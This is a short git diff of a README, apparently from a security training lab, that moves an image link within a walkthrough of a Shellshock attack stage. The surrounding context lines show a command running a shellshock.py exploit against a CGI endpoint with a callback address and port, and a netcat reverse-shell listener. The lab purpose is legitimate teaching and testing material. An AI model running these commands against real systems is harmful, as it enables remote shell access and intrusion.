@@ -11,12 +11,12 @@ The first stage of the attack path exploits the Shellshock vulnerability in the 
 python3 shellshock.py 10.0.1.100 4444 http://10.0.1.66//cgi-bin/stats
 ```
 
+![Shellshock Exploit](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/shellshock.png "Figure: Shellshock Exploit")
+
 - Establish a reverse shell listener:
 ```bash
 nc -lvnp 4444
 ```
-
-![Shellshock Exploit](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/shellshock.png "Figure: Shellshock Exploit")
 
 ![Reverse Shell](https://github.com/NS-unina/SCASS/blob/master/AttackerNode/images/reverse.png "Figure: Reverse Shell")
 
